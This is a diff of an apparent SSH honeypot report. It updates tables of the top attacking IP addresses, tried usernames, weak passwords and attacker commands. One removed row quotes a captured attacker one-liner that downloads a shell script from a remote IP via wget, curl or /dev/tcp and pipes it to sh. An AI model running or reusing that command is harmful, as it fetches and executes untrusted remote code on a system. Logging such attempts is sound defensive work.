@@ -13,51 +13,53 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 109.123.254.15 | 6823 |
-| 8.209.253.56 | 4156 |
-| 8.216.122.147 | 4097 |
-| 149.129.249.160 | 1741 |
-| 167.99.186.137 | 1295 |
-| 8.217.180.105 | 878 |
-| 159.203.2.86 | 791 |
-| 146.190.21.251 | 773 |
-| 206.189.120.23 | 701 |
-| 167.71.143.241 | 685 |
+| 47.236.8.230 | 22311 |
+| 123.56.13.185 | 6816 |
+| 39.104.166.212 | 6658 |
+| 8.140.108.10 | 6611 |
+| 47.114.105.196 | 4493 |
+| 8.210.51.175 | 4460 |
+| 8.209.253.5 | 4398 |
+| 149.129.249.160 | 2827 |
+| 159.203.11.24 | 2293 |
+| 157.230.177.83 | 813 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 2590 |
-| oracle | 83 |
-| admin | 70 |
-| deploy | 69 |
-| postgres | 65 |
-| user | 60 |
-| deployer | 55 |
-| mysql | 53 |
-| hadoop | 52 |
-| git | 50 |
+| root | 12062 |
+| support | 522 |
+| ftpuser | 506 |
+| PlcmSpIp | 505 |
+| newuser | 505 |
+| usuario | 505 |
+| master | 503 |
+| omar | 503 |
+| beavis1 | 501 |
+| concorde | 501 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 508 |
-| 111111 | 126 |
-| 123 | 90 |
-| password | 83 |
-| 12345678 | 78 |
-| danniel12 | 77 |
-| daniel12 | 77 |
-| 1234 | 62 |
-| 12345 | 47 |
-| 1 | 34 |
+| P@ssw0rd | 28 |
+| 123456 | 27 |
+| 1234 | 22 |
+| 1111 | 18 |
+| password | 17 |
+| abc123 | 17 |
+| 12345678 | 17 |
+| 12345 | 17 |
+| rootroot | 16 |
+| root123 | 16 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
+| 183.61.19.105 | uname -s -m |
+| 31.220.95.113 | uname -s -m |
 | 182.92.151.31 | uname -s -m |
-| 182.92.210.172 | uname -s -m |
-| 94.103.125.37 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
+| 182.92.177.196 | uname -s -m |
+| 101.126.20.192 | uname -s -m |
